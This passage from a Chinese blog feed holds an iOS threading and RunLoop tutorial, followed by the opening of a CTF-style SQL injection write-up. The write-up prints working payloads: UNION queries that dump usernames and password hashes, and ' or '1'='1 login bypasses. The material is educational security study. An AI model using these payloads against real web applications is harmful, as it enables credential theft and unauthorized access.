<p><code>nonatomic</code>: 非原子操作 一般不需要多线程支持的时候就用它，这样在并发访问的时候效率会比较高.   在objective-c里面通常对象类型都应该声明为非原子性的. iOS中程序启动的时候系统只会自动生成一个单一的主线程.程序在执行的时候一般情况下是在同一个线程里面对一个属性进行操作. 如果在程序中我们确定某一个属性会在多线程中被使用，并且需要做数据同步，就必须设置成原子性的，但也可以设置成非原子性的，然后自己在程序中用加锁之类的来做数据同步.通常说nonatomic 是提高在非多线程应用中的读写效率.</p>
<hr>
<h2 id="多线程中的锁"><a href="#多线程中的锁" class="headerlink" title="多线程中的锁"></a>多线程中的锁</h2><h4 id="线程安全的产生"><a href="#线程安全的产生" class="headerlink" title="线程安全的产生"></a>线程安全的产生</h4><p>一个很简单的例子就是线程内操作了一个线程外的非线程安全变量(如多个线程操作同一个全局变量)，就需要考虑到线程安全和同步，下面有个简单的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">- (void)getImageName:(NSMutableArray *)imageNames&#123;//假如每个进来的都是一个线程</div><div class="line">    /*1.imageNames是线程外的变量，这个时候就需要考虑线程安全，</div><div class="line">    因为，假如我们当前imageNames的个数是1，线程A和B同时进来发现个数是大于0的，</div><div class="line">    都会去执行remove操作，结果肯定会有一个线程崩溃掉。</div><div class="line">    */</div><div class="line">    /*2.NSMutableArray *array = [[NSMutableArray alloc]initWithArray:imageNames];</div><div class="line">    这里如果新生成一个array，下面也把imageNames换成array就不需要考虑线程安全，</div><div class="line">    但是这样array.count判断永远大于0，也就是永远等于imageNames.count</div><div class="line">     */</div><div class="line">    NSString *imageName;</div><div class="line">    if (imageNames.count&gt;0) &#123;</div><div class="line">        imageName = [imageNames lastObject];</div><div class="line">        [imageNames removeObject:imageName];</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>那么这个时候问题就来了，怎么样才是合理的方案呢？下面就是锁的解决方案</p>
<h4 id="锁的概念"><a href="#锁的概念" class="headerlink" title="锁的概念"></a>锁的概念</h4><p>锁是最常用的同步工具。一段代码在同一时间只能允许被一个线程访问，比如线程A进入加锁代码之后由于已经加锁，另一个线程就无法访问，只有等待前一个线程执行完加锁代码解锁，这个加锁代码才能被另一个线程锁访问。</p>
<p>但是如果将过多的操作代码放入其中的话，一个线程执行的时候，另一个线程一直处于等待状态，这样就无法发挥多线程的作用了。</p>
<h4 id="NSLock"><a href="#NSLock" class="headerlink" title="NSLock"></a>NSLock</h4><p>在Cocoa程序中NSlock中实现了一个简单的互斥锁，实现了NSLocking  protocol。</p>
<p>lock:加锁、unlock：解锁、tryLock：尝试加锁，如果失败不会阻塞线程，而是直接返回。</p>
<p>NOlockBeforeDate:，在指定的date之前暂时阻塞线程（如果没有获取锁的话），如果到期还没有获取锁，则线程被唤醒，函数立即返回NO<br>使用tryLock并不能成功加锁，如果获取锁失败就不会执行加锁代码了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- (void)getImageName:(NSMutableArray *)imageNames&#123;</div><div class="line">    NSString *imageName;</div><div class="line">    [lock lock];</div><div class="line">    if (imageNames.count &gt; 0) &#123;</div><div class="line">        imageName = [imageNames lastObject];</div><div class="line">        [imageNames removeObject:imageName];</div><div class="line">    &#125;</div><div class="line">    [lock unlock];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="synchronized代码块"><a href="#synchronized代码块" class="headerlink" title="@synchronized代码块"></a>@synchronized代码块</h4><p>一开始最早接触的线程锁就是@synchronized，代码简单，名字可以叫同步锁或者叫互斥锁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- (void)getIamgeName:(int)index&#123;</div><div class="line">    NSString *imageName;</div><div class="line">    @synchronized(self) &#123;</div><div class="line">        if (imageNames.count &gt; 0) &#123;</div><div class="line">            imageName = [imageNames lastObject];</div><div class="line">            [imageNames removeObject:imageName];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将互斥锁和自旋锁相比较的话，被锁住后遭到其他线程访问其他线程的处理情况会不同：</p>
<blockquote>
<p>互斥锁：如果发现其他线程正在锁定代码，线程会进入休眠（就绪状态），等待其他线程打开之后才会被唤醒<br>自旋锁：如果发现其他线程正在锁定代码，线程会用死循环的方式，一直等待锁定的代码执行完成，更适合执行不耗时的代码。 </p>
</blockquote>
<p>⚠️：锁定一份代码只用一把锁，用多把锁是无效的</p>
<h4 id="条件信号量dispatch-semaphore-t"><a href="#条件信号量dispatch-semaphore-t" class="headerlink" title="条件信号量dispatch_semaphore_t"></a>条件信号量dispatch_semaphore_t</h4><p><code>dispatch_semaphore_t</code>GCD中信号量，也可以解决资源抢占问题,支持信号通知和信号等待。每当发送一个信号通知，则信号量+1；每当发送一个等待信号时信号量-1,；如果信号量为0则信号会处于等待状态，直到信号量大于0开始执行,这个从理解上的话可以类比一下MRC模式中的引用计数，但是还是有一些差别。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">#import &quot;TestViewController.h&quot;</div><div class="line"></div><div class="line">@interface TestViewController ()</div><div class="line">&#123;</div><div class="line">    dispatch_semaphore_t semaphore;</div><div class="line">&#125;</div><div class="line">@end</div><div class="line"></div><div class="line">@implementation TestViewController</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    // Do any additional setup after loading the view.</div><div class="line">    semaphore = dispatch_semaphore_create(1);</div><div class="line">    /**</div><div class="line">     *  创建一个信号量为1的信号</div><div class="line">     *</div><div class="line">     */</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)getImageName:(NSMutableArray *)imageNames&#123;</div><div class="line">    NSString *imageName;</div><div class="line">    /**</div><div class="line">     *  semaphore：等待信号</div><div class="line">     DISPATCH_TIME_FOREVER：等待时间</div><div class="line">     wait之后信号量-1，为0</div><div class="line">     */</div><div class="line">    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);</div><div class="line">    if (imageNames.count&gt;0) &#123;</div><div class="line">        imageName = [imageNames lastObject];</div><div class="line">        [imageNames removeObject:imageName];</div><div class="line">    &#125;</div><div class="line">    /**</div><div class="line">     *  发送一个信号通知，这时候信号量+1，为1</div><div class="line">     */</div><div class="line">    dispatch_semaphore_signal(semaphore);</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<h4 id="条件锁NSCondition"><a href="#条件锁NSCondition" class="headerlink" title="条件锁NSCondition"></a>条件锁NSCondition</h4><p>NSCondition同样实现了NSLocking协议，所以和NSLock一样，也有lock和unlock方法，可以当作NSLock来解决线程同步问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- (void)getIamgeName:(NSMutableArray *)imageNames&#123;</div><div class="line">    NSString *imageName;</div><div class="line">    [lock lock];</div><div class="line">    if (imageNames.count&gt;0) &#123;</div><div class="line">        imageName = [imageNames lastObject];</div><div class="line">        [imageNames removeObject:imageName];</div><div class="line">    &#125;</div><div class="line">    [lock unlock];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="异步下载图片"><a href="#异步下载图片" class="headerlink" title="异步下载图片"></a>异步下载图片</h2><p>这里通过之前的多线程知识来模拟一个异步下载图片的demo，因为大家都知道主线程是用来刷新UI的，所以网络请求图片放在一个子线程中，然后通过线程间的通信回到主线程刷新UI：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">//重写此方法默认不会加载xib和sb</div><div class="line">-(void)loadView&#123;</div><div class="line">    UIScrollView *sc = [[UIScrollView alloc] initWithFrame: [UIScreen mainScreen].bounds];</div><div class="line">    self.scrollView = sc;</div><div class="line">    self.view = sc;</div><div class="line">    </div><div class="line">    UIImageView *imageView = [[UIImageView alloc] init];</div><div class="line">    self.testImageView = imageView;</div><div class="line">    [self.view addSubview:imageView];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    //创建一个线程</div><div class="line">    NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(downloadImage) object:nil];</div><div class="line">    [thread start];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)downloadImage&#123;</div><div class="line">    NSLog(@&quot;downloading %@&quot;, [NSThread currentThread]);</div><div class="line">    NSURL *url = [NSURL URLWithString:@&quot;https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3751777155,630098310&amp;fm=27&amp;gp=0.jpg&quot;];</div><div class="line">    NSData *data = [NSData dataWithContentsOfURL:url];</div><div class="line">    UIImage *image = [UIImage imageWithData:data];</div><div class="line">    //线程间通信 子--&gt;主</div><div class="line">    [self performSelectorOnMainThread:@selector(updateUI:) withObject:image waitUntilDone:NO];</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)updateUI:(UIImage *)image&#123;</div><div class="line">    NSLog(@&quot;updateUI %@&quot;, [NSThread currentThread]);</div><div class="line">    self.testImageView.image = image;</div><div class="line">    </div><div class="line">    //根据图片的大小来调整位置</div><div class="line">    [self.testImageView sizeToFit];</div><div class="line">    [self.scrollView setContentSize:image.size];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="消息循环"><a href="#消息循环" class="headerlink" title="消息循环"></a>消息循环</h2><h4 id="RunLoop"><a href="#RunLoop" class="headerlink" title="RunLoop"></a>RunLoop</h4><ol>
<li>概念：</li>
</ol>
<p>每个程序都有一个RunLoop对象，主线程默认开启RunLoop，子线程默认不开启，要注意的是如果子线程启动了循环之后没有停止循环，就不会执行任何后续的代码，会形成一个死循环。我们常用到的是 NSRunLoop ，其位于 Foundation 框架中。Foundation 框架实际上是 <code>Core Foundation</code> 的部分导出。而 <code>Core Foundation</code> 的源码是开源的。NSRunLoop 实际上是 CFRunLoop 的高层抽象。CFRunLoop 源码可以从<a href="https://opensource.apple.com/source/CF/" target="_blank" rel="external">这里</a> 下载到。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//在子线程中要手动的开启消息循环，方法有几种：</div><div class="line">//这种方法因为在不同的机子上性能不同，所以不能将时间写死</div><div class="line">[[NSRunLoop currentRunLoop] run UntilDate:[NSDate dateWithTimeIntervalSinceNow:2]];</div><div class="line">//下面这种方法是使用全局变量来控制子线程中消息循环的开关</div><div class="line">NSRunLoop *theRL = [NSRunLoop currentLoop];</div><div class="line">while(shouldKeepRunning &amp;&amp; [theRL runMode:NSDefaultRunLoopMode beforeDate:[NSDate distantFuture]]);</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-29%20%E4%B8%8B%E5%8D%881.51.24.png" alt="屏幕快照 2017-09-29 下午1.51.24.png" title="" class="">
                <p>屏幕快照 2017-09-29 下午1.51.24.png</p>
            </figure>
<ol>
<li>作用&amp;介绍：</li>
</ol>
<ul>
<li>保证程序不退出。</li>
<li>负责监听所有事件，例如：手势触摸，时钟触发，网络加载数据完成等</li>
<li>如果没有事件发生，会让程序进入休眠状态<ul>
<li>iOS有两套API访问和使用RunLoop，那就是<code>Foundation</code>和<code>Core Foundation</code>，两者之间的转换需要桥接</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CFStringRef CFDataType = (__bridge NSString*)FDataType</div><div class="line">NSString *FDataType = (__bridge CFStringRef)CFDataType</div></pre></td></tr></table></figure>
<ul>
<li>响应者链条事件监听过程</li>
</ul>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-29%20%E4%B8%8B%E5%8D%882.06.26.png" alt="屏幕快照 2017-09-29 下午2.06.26.png"></p>
<ol>
<li>关系</li>
</ol>
<p>消息循环和输入源，定时器，运行模式之间到底是个什么样的关系呢？我们可以通过一张图来说明</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-16%20%E4%B8%8B%E5%8D%881.20.45.png" alt="屏幕快照 2017-11-16 下午1.20.45.png" title="" class="">
                <p>屏幕快照 2017-11-16 下午1.20.45.png</p>
            </figure>
<p>在RunLoop中，有多个运行模式，但是runloop只能选择一种模式运行，就像我们的空调有制冷模式、制热模式，但是在运行的时候只能选择一种模式。mode中至少要有一个source或者Timer，只有Observer是不被允许的。</p>
<ol>
<li>系统默认注册的5个Mode</li>
</ol>
<ul>
<li>kCFRunLoopDefaultMode:App的默认Mode，通常主线程是在这个Mode下运行</li>
<li>UITrackingRunLoopMode：界面跟踪mode，用于scrollView跟踪触摸滑动，保证界面华东不受其他mode影响</li>
<li>kCFRunLoopCommonModes：这是一个占位使用的mode，并不是一个真正的mode</li>
<li>UIInitializationRUnLoopMode：在刚启动App时进入的第一个mode，启动完成后就不再使用</li>
<li>GSEventReceiiveRunLoopMode：接受系统事件内部的mode，通常用不到</li>
</ul>
<ol>
<li>事件驱动模型</li>
</ol>
<p>大部分的GUI程序都使用了事件驱动模型，因为一般的GUI用户输入频率比较低，如果每个部分不停的做轮训去获取用户输入，浪费时间又可能比较难处理。而事件处理则是由中央的系统把输入事件派送给需要的部分。事件驱动模型就是典型的职责链模式。它还充分的应用了<code>观察者模式</code>，还有一点很重要就是单线程的应用要处理外部事件都离不开消息循环，事件驱动模型和消息循环是天生一对。</p>
<ul>
<li>桌面上最有名的消息循环就是windows了，WinMain方法是一个死循环不断读取并处理。（派发给窗体）</li>
<li>网页上JavaScript 应用也是单线程的，靠浏览器的消息循环驱动各种事件和回调。（派发给DOM）</li>
</ul>
<h4 id="时钟调度"><a href="#时钟调度" class="headerlink" title="时钟调度"></a>时钟调度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/**使用方法：</div><div class="line">1.创建消息</div><div class="line">2.把消息放入循环，并制定消息的运行模式</div><div class="line">3.在与循环的模式相匹配的时候，消息运行（NSRunLoopCommonModes包含所有的模式，所有在用户交互的时候，循环的模式时钟会被匹配，所以时钟仍然会被触发）</div><div class="line"></div><div class="line">*／</div><div class="line">/*</div><div class="line">        - (void)addTimer:(NSTimer *)timer forMode:(NSString *)mode;</div><div class="line">        </div><div class="line">        NSDefaultRunLoopMode: 时钟，网络。           发生用户交互的时候，时钟会被暂停</div><div class="line">        NSRunLoopCommonModes（占位用的运行模式 ）: 用户交互，响应级别高。   发生用户交互的时候，时钟仍然会触发，如果时钟触发方法非常耗时，</div><div class="line">                                                   使用此方式时用户操作会造成非常严重的卡顿。</div><div class="line">    */</div></pre></td></tr></table></figure>
<ul>
<li><p>以 NSRunLoopCommonModes 方式创建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">// 调度时钟</div><div class="line">self.timer = [NSTimer timerWithTimeInterval:1.0 </div><div class="line">                                     target:self </div><div class="line">                                   selector:@selector(updateTimer) </div><div class="line">                                   userInfo:nil </div><div class="line">                                    repeats:YES];</div><div class="line"></div><div class="line">// 将时钟以 NSRunLoopCommonModes 模式添加到运行循环</div><div class="line">[[NSRunLoop currentRunLoop] addTimer:self.timer forMode:NSRunLoopCommonModes];</div></pre></td></tr></table></figure>
</li>
<li><p>以 NSDefaultRunLoopMode 方式创建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">// 调度时钟</div><div class="line">/*</div><div class="line">    默认将时钟以 NSDefaultRunLoopMode 模式添加到运行循环</div><div class="line">*/</div><div class="line">self.timer = [NSTimer scheduledTimerWithTimeInterval:1.0 </div><div class="line">                                              target:self </div><div class="line">                                            selector:@selector(updateTimer) </div><div class="line">                                            userInfo:nil </div><div class="line">                                             repeats:YES];</div></pre></td></tr></table></figure>
</li>
<li><p>子线程运行循环</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">dispatch_async(dispatch_get_global_queue(0, 0), ^&#123;</div><div class="line"></div><div class="line">    // 在子线程开启时钟，由于子线程的运行循环没有启动，所以没法监听时钟事件</div><div class="line">    self.timer = [NSTimer timerWithTimeInterval:1.0 </div><div class="line">                                         target:self </div><div class="line">                                       selector:@selector(updateTimer) </div><div class="line">                                       userInfo:nil </div><div class="line">                                        repeats:YES];</div><div class="line"></div><div class="line">    [[NSRunLoop currentRunLoop] addTimer:self.timer forMode:NSDefaultRunLoopMode];</div><div class="line"></div><div class="line">    // 启动子线程的运行循环，这句代码就是一个死循环！如果不停止运行循环，不会执行后续的任何代码</div><div class="line">    CFRunLoopRun();</div><div class="line"></div><div class="line">    // 停止子线程运行循环之前，不会执行添加到此处的任何代码</div><div class="line">&#125;);</div><div class="line"></div><div class="line">// 运行循环执行操作方法</div><div class="line">- (void)updateTimer &#123;</div><div class="line"></div><div class="line">    static int num = 0;</div><div class="line"></div><div class="line">    NSLog(@&quot;%d %@&quot;, num++, [NSThread currentThread]);</div><div class="line"></div><div class="line">    // 满足条件后，停止当前的运行循环</div><div class="line">    if (num == 8) &#123;</div><div class="line"></div><div class="line">        // 一旦停止了运行循环，后续代码能够执行，执行完毕后，线程被自动销毁</div><div class="line">        CFRunLoopStop(CFRunLoopGetCurrent());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="参考来源："><a href="#参考来源：" class="headerlink" title="参考来源："></a>参考来源：</h3><p><a href="http://www.jianshu.com/p/a9b900d38bff" target="_blank" rel="external">简书-iOS中的运行循环机制</a></p>
<p><a href="http://honglu.me/2017/03/30/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3RunLoop/" target="_blank" rel="external">深入理解RunLoop</a></p>
<p><a href="https://www.zhihu.com/question/26805116" target="_blank" rel="external">知乎回答：为什么几乎所有的GUI都采用事件驱动模型</a></p>
<p><a href="http://www.jianshu.com/p/d1fd9fa9ee66" target="_blank" rel="external">浅谈iOS中的RunLop</a></p>
]]></content>
      
        <categories>
            
            <category> 消息循环 线程锁 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-SQL注入]]></title>
      <url>/2017/09/25/CTF-SQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>虽然比赛已经过去了一段时间，但是训练依然不能落后，上次苦练的密码、杂项、隐写，半点没考，看来SQL注入和缓冲区溢出还是占比较重啊。</p>
<a id="more"></a>
<h1 id="SQL注入原理和讲解"><a href="#SQL注入原理和讲解" class="headerlink" title="SQL注入原理和讲解"></a>SQL注入原理和讲解</h1><h2 id="实验原理和三层架构"><a href="#实验原理和三层架构" class="headerlink" title="实验原理和三层架构"></a>实验原理和三层架构</h2><h4 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h4><p>SQL注入是通过将恶意的SQL查询或添加语句插入到应用的参数中，再再后台的SQL服务器中解析执行进行的攻击，它是目前黑客对数据库对数据库进行攻击的最常用手段之一。或者说是将恶意sql，植入到系统中。或者跳过系统本身校验，访问系统数据。</p>
<h4 id="Web程序三层架构"><a href="#Web程序三层架构" class="headerlink" title="Web程序三层架构"></a>Web程序三层架构</h4><p>通常意义上我们把整个业务应用划分为：</p>
<ul>
<li>界面层（User Interface layer）</li>
<li>业务逻辑层（Business Logic Layer）</li>
<li>数据访问层（Data access layer）</li>
</ul>
<p>区分层次的目的即为了”高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8810.44.48.png" alt="屏幕快照 2017-09-22 下午10.44.48.png" title="" class="">
                <p>屏幕快照 2017-09-22 下午10.44.48.png</p>
            </figure>
<p>在上图中，用户访问实验楼主页进行了如下过程：</p>
<ul>
<li>在 Web 浏览器中输入 <code>www.shiyanlou.com</code> 连接到实验楼服务器。</li>
<li>业务逻辑层的 Web 服务器从本地存储中加载 <code>index.php</code> 脚本并解析。</li>
<li>脚本连接位于数据访问层的 <code>DBMS</code>（数据库管理系统），并执行 <code>Sql</code> 语句。</li>
<li>数据访问层的数据库管理系统返回 <code>Sql</code> 语句执行结果给 Web 服务器。</li>
<li>业务逻辑层的 Web 服务器将 Web 页面封装成 HTML 格式发送给表示层的 Web 浏览器。</li>
<li>表示层的 Web 浏览器解析 HTML 文件，将内容展示给用户。</li>
</ul>
<p>在三层架构中，所有通信都必须要经过中间层，简单地说，三层架构是一种<strong>线性关系</strong>。</p>
<h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p>SQL请求一般不会有问题，但实际情况是很多时候需要结合用户的输入数据来动态的构造SQL语句，如果用户的输入的数据被构造成恶意的SQL代码，如果没有对这些参数进行审查的话，就会带来意想不到的危险。</p>
<ul>
<li>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。</li>
<li>绕过认证，列如绕过验证登录网站后台。</li>
<li>注入可以借助数据库的存储过程进行提权等操作</li>
</ul>
<h4 id="注入实例之猜解数据库"><a href="#注入实例之猜解数据库" class="headerlink" title="注入实例之猜解数据库"></a>注入实例之猜解数据库</h4><p>来到一个页面我们需要利用漏洞来获取登陆权限的时候，可以对这个网站的数据库进行一些猜测的攻击：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select userName from users where username = &apos;$id&apos;;</div></pre></td></tr></table></figure>
<p>当我们在输入框中猜测数据库是通过这种方式来进行查询，所以就进行对应的注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&apos; order by 1#</div></pre></td></tr></table></figure>
<p>这样的话实际执行的语句就变成了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select userName from users where use_id = &apos;1&apos; order by 1#&apos;;</div><div class="line">#按照mysql的语法，#后面的内容都会被注释掉，来屏蔽后面的单引号，避免语法错误</div></pre></td></tr></table></figure>
<p>这样的话，我们可以利用这个漏洞来获取我们更多想要的信息嘿嘿嘿：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT userName FROM users WHERE user_id = &apos;1&apos; union select database(),user()#;</div><div class="line">#比如利用union语句来拼接多条查询语句,获取当前查询的用户名</div></pre></td></tr></table></figure>
<p>当然这些信息都没有什么卵用，接下来直接上一个重量级的，爆出它所有的账号密码吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select userName from users where user_id = &apos;1&apos; union select user,password from users;</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8811.24.40.png" alt="屏幕快照 2017-09-22 下午11.24.40.png" title="" class="">
                <p>屏幕快照 2017-09-22 下午11.24.40.png</p>
            </figure>
<p>虽然密码使用md5加密过了，但是这种玩意去网上随便找个在线工具就破开了，还是挺有意思</p>
<h4 id="注入实例之验证绕过"><a href="#注入实例之验证绕过" class="headerlink" title="注入实例之验证绕过"></a>注入实例之验证绕过</h4><p>接下来再来试试一个利用SQL漏洞绕过登陆验证的实验，如果我们不知道登陆的话干脆就不要理他好了，悄悄的从旁边绕过去～</p>
<p>这种情况下后台的代码验证类似于这种情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from users where username=&apos;123&apos; and password=&apos;123&apos;</div></pre></td></tr></table></figure>
<p>当数据库存在对应的的用户数据的时候，自然就会返回登陆成功，而我们所做的就是就是伪造一个恒等式让后台判定成功：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">123&apos; or &apos;1&apos;=&apos;1</div><div class="line">#这样以来查询语句就变成了：</div><div class="line">select * from users where username=&apos;123&apos; or &apos;1&apos;=&apos;1&apos; and password=&apos;123&apos; or &apos;1&apos;=&apos;1&apos;</div><div class="line">#当然也可以只输入账号，将后面的语句注销掉，那么就变成了：</div><div class="line">123&apos; or 1=1#&apos;</div><div class="line">select * from users where username=&apos;123&apos; or 1=1 #&apos; and password=&apos;123&apos; or 1=1 #&apos;</div></pre></td></tr></table></figure>
<h4 id="判断SQL注入点"><a href="#判断SQL注入点" class="headerlink" title="判断SQL注入点"></a>判断SQL注入点</h4><p>当然之前的那几种情况都是我们大概都知道了后台的语句之后才做出了漏洞的判断和注入，在我们不知道后台的验证代码的时候，就需要我们自己去判断注入点了：</p>
<p>对 Sql 注入的判断，主要有两个方面：</p>
<ul>
<li>判断该带参数的 Url 是否存在 Sql 注入？</li>
<li>如果存在 Sql 注入，那么属于哪种 Sql 注入？</li>
</ul>
<p>可能存在 Sql 注入攻击的 ASP/PHP/JSP 动态网页中，一个动态网页中可能只有一个参数，有时可能有多个参数。有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的 动态网页且此网页访问了数据库，那么就有可能存在 Sql 注入。如果程序员没有足够的安全意识，没有进行必要的字符过滤，存在SQL注入的可能性就非常大。</p>
<blockquote>
<p>判断SQL漏洞是否存在</p>
</blockquote>
<p>最为经典的单引号引用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxxx.com/abc.php?id=1&apos;</div></pre></td></tr></table></figure>
